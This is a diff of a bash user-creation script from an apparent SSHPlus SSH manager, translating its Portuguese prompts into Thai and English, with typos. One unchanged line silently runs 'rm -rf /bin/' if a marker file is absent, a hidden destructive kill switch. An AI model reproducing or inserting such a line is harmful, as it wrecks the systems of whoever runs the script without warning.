@@ -241,9 +241,9 @@ fun_edithost () {
   fi
 }
 [[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/ > /dev/null 2>&1
-tput setaf 7 ; tput setab 4 ; tput bold ; printf '%30s%s%-15s\n' "Criar usuário SSH" ; tput sgr0
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%30s%s%-15s\n' "สร้างบัญชีผู้ใช้งาน SSH SSH" ; tput sgr0
 echo ""
-echo -ne "\033[1;32mNome do usuário:\033[1;37m "; read username
+echo -ne "\033[1;32mUsername:\033[1;37m "; read username
 awk -F : ' { print $1 }' /etc/passwd > /tmp/users 
 if grep -Fxq "$username" /tmp/users
 then
@@ -272,7 +272,7 @@ else
           tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Você digitou um nome de usuário vazio!" ; echo "" ; tput sgr0
           exit 1
         else  
-           echo -ne "\033[1;32mSenha:\033[1;37m "; read password
+           echo -ne "\033[1;32mpasswor:\033[1;37m "; read password
           if [[ -z $password ]]
           then
             tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Você digitou uma senha vazia!" ; echo "" ; tput sgr0
